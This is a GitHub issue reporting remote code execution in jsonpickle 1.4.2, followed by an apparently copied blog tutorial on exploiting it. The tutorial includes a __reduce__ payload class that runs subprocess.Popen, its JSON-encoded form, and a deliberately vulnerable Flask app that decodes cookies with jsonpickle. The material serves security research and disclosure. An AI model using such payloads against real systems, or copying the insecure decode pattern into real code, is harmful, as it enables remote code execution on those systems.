## Description

![@j0lt-github](https://avatars.githubusercontent.com/u/34833539?u=19239c36e5f108fe66cef95075378dc57041c1d9&v=4&size=48)[j0lt-github](https://github.com/j0lt-github)opened [on Dec 17, 2020](https://github.com/jsonpickle/jsonpickle/issues/332#issue-770111636)

JsonPickle 1.4.2 allows remote code execution during deserialization of a malicious payload through the decode() function.

Attack Vectors : The jsonpickle can be exploited by deserialization of malicious jsonpickled payload with default decode() function of its object. The payload can be easily generated by this payload generator:

<https://github.com/j0lt-github/python-deserialization-attack-payload-generator>

and passed to decode function

like object = jsonpickle.decode(payload)

it will certainly execute command.

## Description

![@j0lt-github](https://avatars.githubusercontent.com/u/34833539?u=19239c36e5f108fe66cef95075378dc57041c1d9&v=4&size=48)[j0lt-github](https://github.com/j0lt-github)opened [on Dec 17, 2020](https://github.com/jsonpickle/jsonpickle/issues/332#issue-770111636)

JsonPickle 1.4.2 allows remote code execution during deserialization of a malicious payload through the decode() function.

Attack Vectors : The jsonpickle can be exploited by deserialization of malicious jsonpickled payload with default decode() function of its object. The payload can be easily generated by this payload generator:

<https://github.com/j0lt-github/python-deserialization-attack-payload-generator>

and passed to decode function

like object = jsonpickle.decode(payload)

it will certainly execute command.

### Overview

Python’s [pickle](https://docs.python.org/3.4/library/pickle.html#module-pickle) module is its primary mechanism for the serialization and deserialization of Python object structures. This module has also been the target for exploitation when it used insecurely by loading malicious ‘pickle’ streams and reconstructing objects from them. The dangers are so prevalent in fact that the pickle documentation explicitly states that it is not intended to be secure against erroneous or malicious constructed data.

Interestingly enough, a few libraries have popped up over the years that support encoding pickled objects in different formats such as JSON and XML. In this post we will specifically look at [jsonpickle](https://jsonpickle.github.io/), which has aptly been described as a library for serializing any arbitrary object graph into JSON. We will explore whether or not we can create malicious encoded JSON pickles, use them for exploitation through a vulnerable web application, and some techniques we can use to dynamically trace the libraries functionality when used.

### Encoding Pickle Objects

The libraries usage is pretty straight forward. You can simply create a new class instance, and use jsonpickle’s `encode()` method to return a JSON encoded pickle. Here is an example from its documentation:

```

class User(object):

def __init__(self, user):

self.user = user

encoded = jsonpickle.encode((User(&amp;quot;rotlogix&amp;quot;)))

[*] Test: {&amp;quot;py/object&amp;quot;: &amp;quot;__main__.User&amp;quot;, &amp;quot;user&amp;quot;: &amp;quot;rotlogix&amp;quot;}

```

This is very nice JSON representation of a pickled object. However, there are a few things we need to understand about how the library seemingly encodes and decodes pickles, and how we can build a properly JSON encoded malicious pickle as well.

### Into The Jar

Before we dive into how we are going to construct a valid JSON encoded malicious pickle, lets revisit some key items about the reconstruction process of pickles to Python objects. Included within the pickle architecture is a virtual machine. The PVM contains three important elements:

*1. Instruction Engine 2. Stack 3. Memo*

The instruction engine is used to process the instructions within the pickle stream, and the stack is a typical stack like structure implemented as a list. The memo is a register scratch space, which is built from an indexed list array. The pickle virtual machine will take a pickle stream and attempt to recreate an object based off of the read instructions. It does this by reconstructing a Python dict from the pickled object, creating a class instance, then populating the class instance from the dictionary elements.

There are 55 supported opcodes for pickle within Python 2, but we will only really focus on the `REDUCE` opcode, which is considerably the most useful for gaining code execution.

`REDUCE` works by popping two items of the PVM stack; the first item is a tuple that contains arguments, and the second item is a callable. `REDUCE` will then execute the callable with the argument tuple and push the resulting object back onto the stack. Lets take a look at this example class and its corresponding shellcode:

```

class Shell(object):

def __reduce__(self):

return (subprocess.Popen, (('whoami'),))

```
```

p0

(csubprocess

Popen

p1

c__builtin__

object

p2

Ntp3

Rp4

(dp5

S'_child_created'

p6

I01

sS'returncode'

p7

NsS'stdout'

p8

NsS'stdin'

p9

NsS'pid'

p10

I67142

sS'stderr'

p11

NsS'universal_newlines'

p12

I00

sb.

```

Without diving into each instruction, essentially we are pushing the module and callable (`Popen`) onto the stack, `REDUCE` is used to pop off the arguments and the callable, we call `Popen`, then push the result back to the stack. So now that we have a base understanding of what our pickle shellcode will look like, we can used jsonpickle’s encode method to return the JSON representation:

```

encoded = jsonpickle.encode(Shell())

[*] JSON encoded Pickle: {&amp;quot;py/object&amp;quot;: &amp;quot;__main__.Shell&amp;quot;, &amp;quot;py/reduce&amp;quot;: [{&amp;quot;py/type&amp;quot;: &amp;quot;subprocess.Popen&amp;quot;}, {&amp;quot;py/tuple&amp;quot;: [&amp;quot;whoami&amp;quot;]}, null, null, null]}

```

So this definitely makes more sense when having some previous knowledge of what the instructions will look like within the pickle stream. However, we really want to understand what happens after the decoding takes place. We can potentially assume at a high level that jsonpickle takes the JSON format, creates a valid pickle, then reconstructs the object from the pickle.

### Tracing

Built into Python’s `sys` module is a function called `settrace()`. You can use this function by passing it a callback with arguments that define the current stack frame, and a keyword event. It is relatively simple to use this for basic function tracing within a Python program. I will leverage the example code here -> <http://pymotw.com/2/sys/tracing.html> to trace every time a ‘call’ is made within the application we are using to test jsonpickle. For those who aren’t already familiar with pickle’s vulnerable functions, we really only care about calls being made to `loads()`. `loads()` will read a pickle object hierarchy from a string, which will de-serialize the pickle stream, and reconstruct our object. As you can imagine, if you pass untrusted data into a the `loads()` function, you will wind up with code execution.

```

def trace(frame, event):

if event != 'call':

return

c_object = frame.f_code

func_name = c_object.co_name

func_name_line_no = frame.f_lineno

func_filename = c_object.co_filename

caller = frame.f_back

caller_line_no = caller.f_lineno

caller_filename = caller.f_code.co_filename

print('Call to {0} on line {1} of {2} from line {3} of {4}'.format(func_name, func_name_line_no, func_filename, caller_line_no, caller_filename))

```

Here are the results after running our program with using `settrace()`:

```

[*] JSON encoded Pickle: {&amp;quot;py/object&amp;quot;: &amp;quot;__main__.Shell&amp;quot;, &amp;quot;py/reduce&amp;quot;: [{&amp;quot;py/type&amp;quot;: &amp;quot;subprocess.Popen&amp;quot;}, {&amp;quot;py/tuple&amp;quot;: [&amp;quot;whoami&amp;quot;]}, null, null, null]}

```

Sure enough when we call `decode()` on the JSON encoded pickle, the library eventually calls `loads()` on the pickle it seemingly reconstructed from JSON.

### Exploitation

What would this look like in a real word scenario? Taking a queue from past pickle related vulnerabilities within Python web frameworks, I have built a vulnerable Flask web application that insecurely calls `decode()` on a cookie, which can be leveraged for remote code execution. Lets take a look at the code:

```

@app.route('/')

def index():

if request.cookies.get(&amp;quot;username&amp;quot;):

u = jsonpickle.decode(base64.b64decode(request.cookies.get(&amp;quot;username&amp;quot;)))

return render_template(&amp;quot;index.html&amp;quot;, username=u.username)

else:

w = redirect(&amp;quot;/whoami&amp;quot;)

response = current_app.make_response(w)

u = User(&amp;quot;Guest&amp;quot;)

encoded = base64.b64encode(jsonpickle.encode(u))

response.set_cookie(&amp;quot;username&amp;quot;, value=encoded)

return response

@app.route('/whoami')

def whoami():

user = jsonpickle.decode(base64.b64decode(request.cookies.get(&amp;quot;username&amp;quot;)))

username = user.username

return render_template(&amp;quot;whoami.html&amp;quot;, username=username)

```

I’m sure you can already spot the vulnerability! Now we can take our previous JSON encoded malicious pickle, base64 encode it, and deliver it to our vulnerable web application. The Flask application will base64 decode the cookie, call `decode()` on the JSON encoded pickle, construct a valid pickle object from the JSON representation, then call `loads()` on the pickle stream.

```

### Wrapping Up

I think it is safe to say that no matter if your are using pickle, or a library that supports the encoding of pickle objects into different formats, that you should always consider the ramifications of loading untrusted data into sensitive functions like `decode()` and `loads()`.
